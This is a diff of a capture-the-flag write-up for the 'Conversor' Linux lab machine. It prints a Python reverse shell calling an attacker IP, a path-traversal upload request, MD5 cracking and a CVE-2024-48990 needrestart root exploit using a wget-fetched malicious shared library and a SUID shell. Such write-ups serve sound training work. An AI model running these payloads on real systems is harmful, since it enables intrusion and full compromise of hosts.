@@ -1,6 +1,29 @@
-We start with a TCP nmap scan:
+---
+layout: post
+title: "Conversor"
+date: 2025-12-15 00:00:00 -0400
+author: Hugo Beaulieu
+categories: linux machine
+tags: linux path-traversal file-upload lxml md5-cracking cve-2024-48990 needrestart python-reverse-shell
+---
 
-```shell
+## Overview
+
+Conversor is a Linux machine running a web application that converts Nmap XML scan results using XSLT templates. The exploitation chain involves discovering a path traversal vulnerability in the file upload functionality, leveraging automatic cron-based Python script execution to gain initial access, cracking MD5 hashes to obtain SSH credentials, and exploiting CVE-2024-48990 in the needrestart utility to achieve root privileges.
+
+## Initial Enumeration
+
+### Nmap Scan
+
+We start with a TCP nmap scan to identify open services:
+
+```bash
+nmap -sV -v conversor.htb
+```
+
+Results:
+
+```
 22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey:
 |   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
@@ -13,80 +36,71 @@ We start with a TCP nmap scan:
 |_Requested resource was /login
 ```
 
-Then a UDP scan for the top 1000 ports but with no success.
+Two services are exposed:
 
-We also do a WhatWeb scan:
+- SSH on port 22 (OpenSSH 8.9p1)
+- HTTP on port 80 (Apache 2.4.52)
 
-```shell
-[ Apache ]
-	The Apache HTTP Server Project is an effort to develop and
-	maintain an open-source HTTP server for modern operating
-	systems including UNIX and Windows NT. The goal of this
-	project is to provide a secure, efficient and extensible
-	server that provides HTTP services in sync with the current
-	HTTP standards.
+### UDP Scan
 
-	Version      : 2.4.52 (from HTTP Server Header)
-	Google Dorks: (3)
-	Website     : http://httpd.apache.org/
+We also perform a UDP scan for the top 1000 ports but find no additional services.
 
-[ HTML5 ]
-	HTML version 5, detected by the doctype declaration
+### Technology Stack
 
+Using WhatWeb to fingerprint the application:
 
-[ HTTPServer ]
-	HTTP server header string. This plugin also attempts to
-	identify the operating system from the server header.
-
-	OS           : Ubuntu Linux
-	String       : Apache/2.4.52 (Ubuntu) (from server string)
-
-[ Matomo ]
-	Matomo is the leading open alternative to Google Analytics
-	that gives you full control over your data. Matomo lets you
-	easily collect data from websites, apps & the IoT and
-	visualise this data and extract insights. Privacy is
-	built-in. Matomo was formerly known as Piwik, and is
-	developed in PHP.
-
-	Aggressive function available (check plugin file or details).
-	Google Dorks: (1)
-	Website     : https://matomo.org
-
-[ RedirectLocation ]
-	HTTP Server string location. used with http-status 301 and
-	302
-
-	String       : /login (from location)
-
-HTTP Headers:
-	HTTP/1.1 302 FOUND
-	Date: Mon, 15 Dec 2025 21:39:23 GMT
-	Server: Apache/2.4.52 (Ubuntu)
-	Content-Length: 199
-	Location: /login
-	Connection: close
-	Content-Type: text/html; charset=utf-8
-
+```bash
+whatweb http://conversor.htb
 ```
 
-Then we scan the directories using gobuster:
+Results:
 
-```shell
+```
+[ Apache ]
+  Version      : 2.4.52 (from HTTP Server Header)
+  OS           : Ubuntu Linux
+
+[ HTML5 ]
+  HTML version 5, detected by the doctype declaration
+
+[ Matomo ]
+  Matomo is the leading open alternative to Google Analytics
+
+[ RedirectLocation ]
+  String       : /login (from location)
+```
+
+The application redirects to `/login` and uses Matomo analytics.
+
+### Directory Enumeration
+
+We scan directories using gobuster:
+
+```bash
+gobuster dir -u http://conversor.htb -w wordlist.txt
+```
+
+Discovered paths:
+
+```
 /javascript           (Status: 301) [Size: 319] [--> http://conversor.htb/javascript/]
 /about                (Status: 200) [Size: 2842]
 /login                (Status: 200) [Size: 722]
 /register             (Status: 200) [Size: 726]
 /logout               (Status: 302) [Size: 199] [--> /login]
 /server-status        (Status: 403) [Size: 278]
-/server-status/       (Status: 403) [Size: 278]
 /convert              (Status: 405) [Size: 153]
 ```
 
-And the subdomains using ffuf, but it's difficult since the response size is always changing.
+## Web Application Analysis
 
-If we create an account at /register and then use the /login route, we are welcomed by a form were we can convert nmap scan from XML and XLST to a more aesthetic format using the /convert endpoint.
-There is also XSLT a template we can download:
+### Registration and Login
+
+After creating an account at `/register` and logging in via `/login`, we're presented with a form that converts Nmap scan results from XML and XSLT formats to a more aesthetic HTML presentation using the `/convert` endpoint.
+
+### XSLT Template Discovery
+
+The application provides a downloadable XSLT template for formatting Nmap results:
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -105,56 +119,7 @@ There is also XSLT a template we can download:
             margin: 0;
             padding: 0;
           }
-          h1, h2, h3 {
-            text-align: center;
-            font-weight: 300;
-          }
-          .card {
-            background: rgba(255, 255, 255, 0.05);
-            margin: 30px auto;
-            padding: 20px;
-            border-radius: 12px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
-            width: 80%;
-          }
-          table {
-            width: 100%;
-            border-collapse: collapse;
-            margin-top: 15px;
-          }
-          th, td {
-            padding: 10px;
-            text-align: center;
-          }
-          th {
-            background: rgba(255,255,255,0.1);
-            color: #ffcc70;
-            font-weight: 600;
-            border-bottom: 2px solid rgba(255,255,255,0.2);
-          }
-          tr:nth-child(even) {
-            background: rgba(255,255,255,0.03);
-          }
-          tr:hover {
-            background: rgba(255,255,255,0.1);
-          }
-          .open {
-            color: #00ff99;
-            font-weight: bold;
-          }
-          .closed {
-            color: #ff5555;
-            font-weight: bold;
-          }
-          .host-header {
-            font-size: 20px;
-            margin-bottom: 10px;
-            color: #ffd369;
-          }
-          .ip {
-            font-weight: bold;
-            color: #00d4ff;
-          }
+          /* ... additional styling ... */
         </style>
       </head>
       <body>
@@ -165,9 +130,6 @@ There is also XSLT a template we can download:
           <div class="card">
             <div class="host-header">
               Host: <span class="ip"><xsl:value-of select="address[@addrtype='ipv4']/@addr"/></span>
-              <xsl:if test="hostnames/hostname/@name">
-                (<xsl:value-of select="hostnames/hostname/@name"/>)
-              </xsl:if>
             </div>
             <table>
               <tr>
@@ -198,111 +160,156 @@ There is also XSLT a template we can download:
 </xsl:stylesheet>
 ```
 
-Since we are logged in, we try the /server-status page but we still get a 403.
+This template processes Nmap XML output and renders it as formatted HTML with styling.
 
-If we visit the /about page, we find a download button that point to the app source code at /static/source_code.tar.gz
+### Source Code Discovery
 
-If we try to extract it, we get an error:
+Visiting the `/about` page reveals a download button pointing to the application source code at `/static/source_code.tar.gz`.
 
-```shell
+### Extracting the Archive
+
+Attempting to extract the archive with standard gzip arguments fails:
+
+```bash
 tar -xzf source_code.tar.gz
+```
 
+Error:
+
+```
 gzip: stdin: not in gzip format
 tar: Child returned status 1
 tar: Error is not recoverable: exiting now
 ```
 
-If we identify the archive, it tell us it's a .tar, not a .tar.gz:
+We identify the actual file type:
+
+```bash
+file source_code.tar.gz
+```
+
+Result:
 
 ```
-file source_code.tar.gz
 source_code.tar.gz: POSIX tar archive (GNU)
 ```
 
-We need to adjust the arguments in consequence:
+Despite the `.tar.gz` extension, it's actually a plain `.tar` file. We extract it correctly:
 
-```shell
+```bash
 tar -xf source_code.tar.gz
 ```
 
-This gives us the following files:
+### Source Code Structure
 
-```shell
+The extracted source reveals the following structure:
+
+```
 ├── app.py
 ├── app.wsgi
 ├── install.md
 ├── instance
-│   └── users.db
+│   └── users.db
 ├── scripts
 ├── static
-│   ├── images
-│   │   ├── arturo.png
-│   │   ├── david.png
-│   │   └── fismathack.png
-│   ├── nmap.xslt
-│   └── style.css
+│   ├── images
+│   │   ├── arturo.png
+│   │   ├── david.png
+│   │   └── fismathack.png
+│   ├── nmap.xslt
+│   └── style.css
 ├── templates
-│   ├── about.html
-│   ├── base.html
-│   ├── index.html
-│   ├── login.html
-│   ├── register.html
-│   └── result.html
+│   ├── about.html
+│   ├── base.html
+│   ├── index.html
+│   ├── login.html
+│   ├── register.html
+│   └── result.html
 └── uploads
 ```
 
-The app.py and users.db files are particularly interesting.
+### Database Analysis
 
-If we open the users.db file using sqlite3, we find 2 empty tables:
+We examine the SQLite database using sqlite3:
+
+```bash
+sqlite3 instance/users.db
+```
 
 ```sql
 .tables
+```
+
+Result:
+
+```
 files  users
-
-SELECT * FROM users;
-
-SELECT * FROM files;
 ```
 
-In `install.md`, we find the following clue:
+Both tables are empty, but this confirms the database structure for later exploitation.
 
-```
+### Critical Discovery: Cron-Based Script Execution
 
+The `install.md` file contains a crucial deployment detail:
+
+```markdown
 If you want to run Python scripts (for example, our server deletes all files older than 60 minutes to avoid system overload), you can add the following line to your /etc/crontab.
 
-"""
-* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
-"""
-
+- - - - - www-data for f in /var/www/conversor.htb/scripts/\*.py; do python3 "$f"; done
 ```
 
-If we open app.py, we find the code for the /convert endpoint that use `lxml` which is vulnerable to CVE-2025-6985. Unfortunately, the server seems to have protections (likely XSLTAccessControl)
+This reveals that:
 
-We also find a file upload path traversal vulnerability:
+- A cron job runs every minute
+- It executes ALL Python files in `/var/www/conversor.htb/scripts/`
+- Scripts run as the `www-data` user
+
+### Path Traversal Vulnerability
+
+Examining `app.py`, we discover a critical path traversal vulnerability in the file upload handling:
 
 ```python
 xml_path = os.path.join(UPLOAD_FOLDER, xml_file.filename)  # NO SANITIZATION!
 xml_file.save(xml_path)
 ```
 
-To recap, we have:
+The application:
 
-- A Path Traversal in filename parameter (no input validation)
-- An rbitrary File Write to /scripts/ directory
-- A Cron-based Code Execution (automatic within 60 seconds)
+1. Takes the `xml_file.filename` parameter directly from user input
+2. Performs NO validation or sanitization
+3. Joins it with `UPLOAD_FOLDER` and saves the file
 
-To exploit this, we would need to:
+This allows us to control the save path using `../` sequences in the filename.
 
-- Intercept the POST request to /convert using Burp Suite
-- Modify the filename from nmap.xml to ../scripts/shell.py
-- Replace the file content with a Python reverse shell
-- Start a netcat listener: nc -lvnp 4444
-- Execute the malicious POST request
-- Wait ≤60 seconds for cron to execute the script
+## Exploitation Chain
 
-Here is the Burp payload:
+### Attack Strategy
 
+We can chain together three vulnerabilities:
+
+1. **Path Traversal** in the filename parameter (no input validation)
+2. **Arbitrary File Write** to the `/scripts/` directory via `../scripts/`
+3. **Cron-Based Code Execution** (automatic execution within 60 seconds)
+
+### Creating the Payload
+
+We prepare a Python reverse shell:
+
+```python
+import socket,subprocess,os
+s=socket.socket()
+s.connect(("10.10.14.18",4444))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+subprocess.call(["/bin/bash","-i"])
 ```
+
+### Exploitation via Burp Suite
+
+We intercept the POST request to `/convert` using Burp Suite and modify it:
+
+```http
 POST /convert HTTP/1.1
 Host: conversor.htb
 Content-Length: 717
@@ -341,9 +348,22 @@ Content-Type: application/xslt+xml
 ------WebKitFormBoundaryBcpfdqSJypzbnoIa--
 ```
 
-And it worked ! We now have a reverse shell:
+Key modifications:
 
-```shell
+- Changed `filename="nmap.xml"` to `filename="../scripts/shell.py"`
+- Replaced XML content with Python reverse shell payload
+
+### Getting a Shell
+
+We start a netcat listener:
+
+```bash
+nc -lvnp 4444
+```
+
+After sending the malicious request, within 60 seconds the cron job executes our script:
+
+```bash
 listening on [any] 4444 ...
 connect to [10.10.14.18] from (UNKNOWN) [10.129.37.71] 46828
 bash: cannot set terminal process group (4457): Inappropriate ioctl for device
@@ -351,24 +371,52 @@ bash: no job control in this shell
 www-data@conversor:~$
 ```
 
-Now we can look at the users.db inside the server:
+Success! We now have a shell as `www-data`.
+
+## Lateral Movement to fismathack
+
+### Database Enumeration
+
+Now that we're on the system, we can examine the actual database:
+
+```bash
+sqlite3 /var/www/conversor.htb/instance/users.db
+```
 
 ```sql
-sqlite3 /var/www/conversor.htb/instance/users.db
-
 .tables
-files  users
+```
 
-SELECT * from users;
+Result:
+
+```
+files  users
+```
+
+```sql
+SELECT * FROM users;
+```
+
+Result:
+
+```
 1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
 5|test|098f6bcd4621d373cade4e832627b4f6
 ```
 
-We can identify the hash with namethathash:
+We've discovered the `fismathack` user with an MD5 password hash.
 
-```shell
-5b5c3ac3a1c897c94caad48e6c71fdec
+### Hash Identification
 
+We use name-that-hash to confirm the hash type:
+
+```bash
+nth -t 5b5c3ac3a1c897c94caad48e6c71fdec
+```
+
+Result:
+
+```
 Most Likely
 MD5, HC: 0 JtR: raw-md5 Summary: Used for Linux Shadow files.
 MD4, HC: 900 JtR: raw-md4
@@ -376,7 +424,16 @@ NTLM, HC: 1000 JtR: nt Summary: Often used in Windows Active Directory.
 Domain Cached Credentials, HC: 1100 JtR: mscach
 ```
 
-Now that we know the hash type, we can try to crack it with hashcat:
+### Hash Cracking
+
+We crack the MD5 hash using hashcat:
+
+```bash
+echo "5b5c3ac3a1c897c94caad48e6c71fdec" > hash.txt
+hashcat -m 0 -a 0 hash.txt rockyou.txt -w 4
+```
+
+Result:
 
 ```
 5b5c3ac3a1c897c94caad48e6c71fdec:Keepmesafeandwarm
@@ -387,20 +444,40 @@ Hash.Mode........: 0 (MD5)
 Hash.Target......: 5b5c3ac3a1c897c94caad48e6c71fdec
 ```
 
-Now we can connect as fismathack and display the user flag:
+Credentials obtained: `fismathack:Keepmesafeandwarm`
 
-```shell
+### SSH Access
+
+We connect via SSH with the recovered credentials:
+
+```bash
 ssh fismathack@conversor.htb
-
-cat user.txt
-2936abb855d32318ec34fa57b304035b
+# Password: Keepmesafeandwarm
 ```
 
-The next step is to run and upload linpeas:
+Success! We can now retrieve the user flag:
 
-```shell
+```bash
+cat user.txt
+```
+
+Flag: `2936abb855d32318ec34fa57b304035b`
+
+## Privilege Escalation to Root
+
+### LinPEAS Enumeration
+
+We run LinPEAS to enumerate privilege escalation vectors:
+
+```bash
+./linpeas.sh
+```
+
+Key finding:
+
+```
 ╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
-╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation#sudo-and-suid
 Matching Defaults entries for fismathack on conversor:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
 
@@ -408,13 +485,19 @@ User fismathack may run the following commands on conversor:
     (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
 ```
 
-We can run needrestart as sudo. We just need to find a way to exploit this.
+The user `fismathack` can run `/usr/sbin/needrestart` as root without a password.
 
-Let's start by listing the command help:
+### needrestart Analysis
 
-```shell
+We check the version and help information:
+
+```bash
 /usr/sbin/needrestart --help
+```
 
+Output shows:
+
+```
 needrestart 3.7 - Restart daemons after library updates.
 
 Authors:
@@ -422,53 +505,19 @@ Authors:
 
 Copyright Holder:
   2013 - 2022 (C) Thomas Liske [http://fiasko-nw.net/~thomas/]
-
-Upstream:
-  https://github.com/liske/needrestart
-
-This program is free software; you can redistribute it and/or modify
-it under the terms of the GNU General Public License as published by
-the Free Software Foundation; either version 2 of the License, or
-(at your option) any later version.
-
-Usage:
-
-  needrestart [-vn] [-c <cfg>] [-r <mode>] [-f <fe>] [-u <ui>] [-(b|p|o)] [-klw]
-
-    -v		be more verbose
-    -q		be quiet
-    -m <mode>	set detail level
-	e	(e)asy mode
-	a	(a)dvanced mode
-    -n		set default answer to 'no'
-    -c <cfg>	config filename
-    -r <mode>	set restart mode
-	l	(l)ist only
-	i	(i)nteractive restart
-	a	(a)utomatically restart
-    -b		enable batch mode
-    -p          enable nagios plugin mode
-    -o          enable OpenMetrics output mode, implies batch mode, cannot be used simultaneously with -p
-    -f <fe>	override debconf frontend (DEBIAN_FRONTEND, debconf(7))
-    -t <seconds> tolerate interpreter process start times within this value
-    -u <ui>     use preferred UI package (-u ? shows available packages)
-
-  By using the following options only the specified checks are performed:
-    -k          check for obsolete kernel
-    -l          check for obsolete libraries
-    -w          check for obsolete CPU microcode
-
-    --help      show this help
-    --version   show version information
 ```
 
-Looking online, version 3.7 of needrestart is vulnerable to [CVE-2024-48990](https://github.com/pentestfunctions/CVE-2024-48990-PoC-Testing).
+Version 3.7 is vulnerable to **CVE-2024-48990**, which allows local privilege escalation through Python library hijacking.
 
-To exploit this, we need to:
+### CVE-2024-48990 Exploitation
 
-Compile a malicious shared library on our machine and serve it:
+This vulnerability exploits the Python library search path mechanism. When `needrestart` runs as root, it imports Python modules. By creating a malicious shared library in a directory included in `PYTHONPATH`, we can inject code that executes with root privileges.
 
-```shell
+#### Creating the Malicious Library
+
+On our attack machine, we compile a malicious shared library:
+
+```bash
 # Step 1: Create the malicious C code
 cat << 'EOF' > /tmp/lib.c
 #include <stdio.h>
@@ -493,28 +542,28 @@ void pwn() {
 }
 EOF
 
-# Step 2: Compile it (make sure you're on a Linux x86_64 machine)
+# Step 2: Compile it
 gcc -shared -fPIC -o __init__.so /tmp/lib.c
 
 # Step 3: Verify it compiled correctly
 file __init__.so
 # Should show: ELF 64-bit LSB shared object, x86-64
 
-# Check for the constructor symbol
-nm -D __init__.so | grep pwn
-# Should show something with 'pwn'
-
 # Step 4: Start a simple HTTP server to transfer
 python3 -m http.server 8000
 ```
 
-Download the malicous library, create a python listener and start the exploit to create a SUID shell on the target machine:
+The `__attribute__((constructor))` ensures the `pwn()` function executes automatically when the shared library is loaded, before the main program runs.
 
-```shell
-# Create directory structure
+#### Transferring and Setting Up
+
+On the target machine:
+
+```bash
+# Create directory structure that mimics importlib
 mkdir -p /tmp/malicious/importlib
 
-# Download the .so file from our attack machine
+# Download the malicious .so file
 wget http://10.10.14.18:8000/__init__.so -O /tmp/malicious/importlib/__init__.so
 
 # Verify the file transferred correctly
@@ -522,10 +571,15 @@ ls -la /tmp/malicious/importlib/__init__.so
 file /tmp/malicious/importlib/__init__.so
 # Should show: ELF 64-bit LSB shared object, x86-64
 
-# Make it executable (just in case)
+# Make it executable
 chmod +x /tmp/malicious/importlib/__init__.so
+```
 
-# Create the Python waiting script
+#### Creating the Exploit Trigger
+
+We create a Python script that keeps a process alive with our malicious library in its path:
+
+```bash
 cat << 'EOF' > /tmp/malicious/exploit.py
 import time
 import os
@@ -549,7 +603,7 @@ while True:
     time.sleep(1)
 EOF
 
-# Start the exploit
+# Start the exploit with our malicious PYTHONPATH
 cd /tmp/malicious
 PYTHONPATH=/tmp/malicious python3 exploit.py &
 
@@ -557,26 +611,62 @@ PYTHONPATH=/tmp/malicious python3 exploit.py &
 ps aux | grep exploit.py
 ```
 
-Run needrestart in another terminal on our target machine, then execute the SUID shell:
+#### Triggering the Exploit
 
-```shell
+In another terminal session on the target:
+
+```bash
 sudo needrestart
+```
 
-# Check if the SUID shell was created
+When `needrestart` runs as root, it attempts to import Python modules. Our `PYTHONPATH` manipulation causes it to load our malicious `__init__.so` from `/tmp/malicious/importlib/`, which executes the constructor function and creates a SUID bash shell.
+
+#### Verifying Success
+
+Check if the SUID shell was created:
+
+```bash
 ls -la /tmp/rootbash
 # Should show: -rwsr-xr-x ... /tmp/rootbash
 
-# Also check if the flag file exists (proves constructor ran)
+# Also check if the flag file exists
 ls -la /tmp/pwned
-
-# Execute the SUID shell
-/tmp/rootbash -p
-
-# Verify we're root
-whoami
-
-# Get the flag
-cat /root/root.txt
-
-4768ecc50ae5b7b36d84de17f56e24ac
 ```
+
+#### Escalating to Root
+
+Execute the SUID shell:
+
+```bash
+/tmp/rootbash -p
+```
+
+The `-p` flag preserves the SUID privileges. We verify root access:
+
+```bash
+whoami
+# root
+```
+
+### Root Flag
+
+Finally, we retrieve the root flag:
+
+```bash
+cat /root/root.txt
+```
+
+Flag: `4768ecc50ae5b7b36d84de17f56e24ac`
+
+## Key Takeaways
+
+- **Path traversal vulnerabilities** in file uploads can lead to arbitrary file write when combined with insufficient input validation
+- **Cron jobs executing scripts** from predictable directories create opportunities for code execution if write access can be obtained
+- **Source code exposure** through downloadable archives can reveal critical vulnerabilities and deployment details
+- **MD5 hashing** remains easily crackable with modern tools and should not be used for password storage
+- **Password reuse** across web applications and SSH is common in enterprise environments
+- **Sudo privileges on system maintenance tools** like needrestart can be exploited for privilege escalation
+- **CVE-2024-48990** demonstrates how Python library search path manipulation can compromise privileged processes
+- **SUID shell creation** is an effective post-exploitation technique for maintaining privileged access
+- **Constructor functions in shared libraries** execute automatically on load, making them ideal for privilege escalation payloads
+- **Always check file extensions** against actual file types - misnamed archives can cause extraction issues
